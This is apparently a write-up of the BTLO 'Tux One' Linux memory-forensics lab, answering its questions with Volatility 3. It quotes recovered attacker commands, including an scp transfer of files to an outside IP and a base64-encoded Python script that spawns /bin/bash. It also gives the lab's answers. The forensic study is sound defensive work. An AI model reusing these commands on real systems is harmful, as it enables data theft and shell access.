# 🚨 Tux One Investigation

---

## 🎯 Objective
Conduct Linux memory forensics analysis on a compromised system image to identify evidence of attacker activity, malicious payloads, command execution, and indicators of compromise.

---

## 🧾 Lab Details
- **Platform:** Blue Team Labs Online (BTLO)  
- **Lab:** Tux One  
- **Difficulty:** Medium  
- **OS:** Linux  
- **Category:** Memory Forensics  

---

## 📖 Scenario
A biotech startup recently suffered a cyber attack in which attackers successfully breached the internal network and moved laterally onto a victim machine.

The IT team managed to isolate the affected system and capture a memory dump before taking the host offline for investigation.

The exact motive and purpose of the attack remain unknown, making memory analysis critical to uncover attacker activity, payloads, and evidence of compromise.

The objective of this investigation is to analyze the provided Linux memory image and identify indicators of malicious behavior using Volatility 3 and other forensic techniques.

---

## 🛠️ Tools Used
- Volatility 3  
- Linux Memory Forensics  
- Bash History Analysis  

---

## 🔍 Investigation Process

Before starting the analysis, the provided Linux symbol file:

```text id="k1zt8j"
5.4.0-150-generic.json
```
was copied into the Volatility3 symbols directory:

volatility3/volatility3/symbols/linux

For anyone new to Volatility 3, the following command can be used to display available plugins and options:

python3.7 vol.py --help

The memory image was then analyzed using multiple Volatility3 plugins to identify system information, attacker commands, and malicious activity.

Q1) What version of Linux is the machine running?

To identify the Linux version running on the compromised system, I used the following Volatility3 plugin:

python3.7 vol.py -f "/home/ubuntu/Desktop/TuxOne/system.mem" banners.Banners

When running Volatility3 for the first time, it may take additional time to process the memory image and load the required Linux symbols.

The plugin output revealed the operating system version:

ubuntu 18.04

<img width="1894" height="872" alt="TuxOne-Q1" src="https://github.com/user-attachments/assets/29f3c738-bcab-44ff-a99d-a4394e3e3f54" />

***Answer ==> ubuntu 18.04***
---

Q2) What is the name of the victims machine?

For this question, I initially was not sure which Volatility plugin would directly reveal the hostname.

Instead, I used a simple strings and grep approach against the memory image:

strings system.mem | grep -i "hostname="

This revealed the hostname of the compromised machine:

thumbo

<img width="1894" height="869" alt="TuxOne-Q2" src="https://github.com/user-attachments/assets/286bdb95-9d53-4967-9933-977d49b6b091" />

***Answer ==> thumbo***
---

Q3) It looks like the attacker was attempting to call back to another internal IP that has been compromised, What is the IP of the server?

To investigate attacker command activity, I used the following Volatility3 plugin to recover Bash command history from memory:

python3.7 vol.py -f "/home/ubuntu/Desktop/TuxOne/system.mem" linux.bash.Bash

While reviewing the recovered Bash commands, I identified references to another compromised internal server IP:

192.168.100.187

This appeared to be another internal machine the attacker was attempting to communicate with.

***Answer ==> 192.168.100.187***
Q4) What is the name of the python payload being installed, and what port was it retrieved from?

While reviewing the same recovered Bash history from the previous question, I identified evidence of a Python payload being downloaded.

The commands revealed the following payload name and associated port:

ragdoll.py

and:

8888

This indicated the attacker attempted to retrieve the payload over port 8888.

***Answer ==> ragdoll.py, 8888***

<img width="1897" height="878" alt="TuxOne-Q3-Q4" src="https://github.com/user-attachments/assets/8c4b805e-3a01-49bf-9183-0768de39e1cb" />

---
Q5) The attacker also pulled some files down from another machine using the SCP command. Whats the name of the directory they pulled the files from?

While reviewing the Bash history output, I identified the following SCP command:

scp 3viL/* root@212.71.251.115:/

This command indicates that the attacker used:

scp

to recursively transfer files from a local directory to another remote machine.

The directory being transferred was:

3viL

This strongly suggests the attacker was staging or exfiltrating files from the compromised system to another server.

<img width="1892" height="829" alt="TuxOne-Q5" src="https://github.com/user-attachments/assets/d247d6c5-537f-449c-9581-609311ca6fd1" />

***Answer ==> 3vil***

---
Q6) What is the name of the .mp4 file being downloaded?

To identify downloaded media files, I filtered the recovered Bash history for .mp4 references using:

python3.7 vol.py -f "/home/ubuntu/Desktop/TuxOne/system.mem" linux.bash.Bash | grep ".mp4"

This revealed that the attacker used wget to download the following file:

Slow1.mp4

The recovered commands included:

wget https://slmedia.ams3.digitaloceanspaces.com/Slow1.mp4

<img width="1895" height="866" alt="TuxOne-Q6" src="https://github.com/user-attachments/assets/53e60c6a-c72c-459e-9489-4c3b339b2b21" />

***Answer ==> Slow1.mp4***
---

Q7) One of those files was a file named privpyscript.py. What is the name of the subprocess that the script is trying to load?

While examining the Bash history output, I identified a Base64-encoded string being written into:

privpyscript.py

The command observed was:

echo "aW1wb3J0IHN1YnByb2Nlc3MsIGJhc2U2NDogc3VicHJvY2Vzcy5jYWxsKFsnbHNdKTsgc3VicHJvY2Vzcy5jYWxsKFtiYXNlNjQuYjY0ZGVjb2RlKCdMMkpwYmk5aVlYTm9DZz09JykuZGVjb2RlKCd1dGYtOCldKTs=" > privpyscript.py

<img width="1895" height="822" alt="TuxOne-Q7-P1" src="https://github.com/user-attachments/assets/6630affd-3bca-47d6-ae5a-460e26ad95b8" />

To analyze the script contents, I decoded the Base64 data using either:

CyberChef
Linux base64 -d

Example:

echo "aW1wb3J0IHN1YnByb2Nlc3MsIGJhc2U2NDogc3VicHJvY2Vzcy5jYWxsKFsnbHNdKTsgc3VicHJvY2Vzcy5jYWxsKFtiYXNlNjQuYjY0ZGVjb2RlKCdMMkpwYmk5aVlYTm9DZz09JykuZGVjb2RlKCd1dGYtOCldKTs=" | base64 -d

This revealed another encoded value:

echo 'L2Jpbi9iYXNoCg==' | base64 -d

The final decoded subprocess identified was:

/bin/bash

This indicates the script attempted to spawn a Bash shell as a subprocess.

<img width="1898" height="823" alt="TuxOne-Q7-P2" src="https://github.com/user-attachments/assets/80876f27-d9d7-4604-bca7-49afeac3872b" />

***Answer ==> /bin/bash***
---
## Conclusion

This investigation showed how valuable Linux memory forensics can be for identifying attacker activity on a compromised system.

Using Volatility3 and Bash history analysis, I was able to uncover malicious commands, internal communication attempts, downloaded payloads, SCP transfers, and suspicious Python scripts executed by the attacker.

Overall, the lab provided good hands-on experience with Linux memory analysis and demonstrated how memory artifacts can reveal important evidence even after a system is taken offline.
---

<img width="898" height="826" alt="TuxOne-Done" src="https://github.com/user-attachments/assets/a96287eb-b17b-4220-883b-77e218acb181" />
